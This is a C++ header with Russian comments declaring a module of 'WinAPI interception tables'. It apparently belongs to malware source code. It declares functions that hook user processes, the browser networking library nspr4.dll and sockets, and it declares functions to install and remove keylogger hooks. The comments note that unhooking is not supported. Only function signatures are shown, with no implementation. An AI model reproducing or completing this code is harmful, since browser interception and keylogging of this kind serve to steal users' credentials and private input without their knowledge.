/*
  Таблицы перехвата WinAPI.

  Данный модуль подчинается Core, и не имеет каких либо защит от повторных перехватов.
  По соображениям стабилности unhook не возможен.
*/
#pragma once

namespace WinApiTables
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Установка для процесса пользователя. 

    Return - true - в случаи успеха,
             false - в случаи ошибки.
  */
  bool _setUserHooks(void);

  /*
    Снятие хуков для процесса пользователя.

    Return - true - в случаи успеха,
             false - в случаи ошибки.
  */
  bool _removeUserHooks(void);

  /*
    Попытка установить перехват для nspr4.dll. 

    Return - true - в случаи успеха,
             false - в случаи ошибки.
  */
  bool _trySetNspr4Hooks(void);

  /*
    Попытка установить перехват для nspr4.dll. 

    IN moduleName   - базове имя предпалогоемого модуля.
    IN moduleHandle - хэндл предпалогоемого модуля.
    
    Return          - true - в случаи успеха,
                      false - в случаи ошибки.
  */
  bool _trySetNspr4HooksEx(LPWSTR moduleName, HMODULE moduleHandle);

  /*
    Установка для nspr4.dll. 

    IN nspr4Handle - хэндл nspr4.dll.
    
    Return         - true - в случаи успеха,
                     false - в случаи ошибки.
  */
  bool _setNspr4Hooks(HMODULE nspr4Handle);

  bool _setSocketHooks();

  bool _removeNspr4Hooks();

  bool _setKeyloggerHooks(void);

  bool _removeKeyloggerHooks(void);

  bool _removeSocketHooks();
};
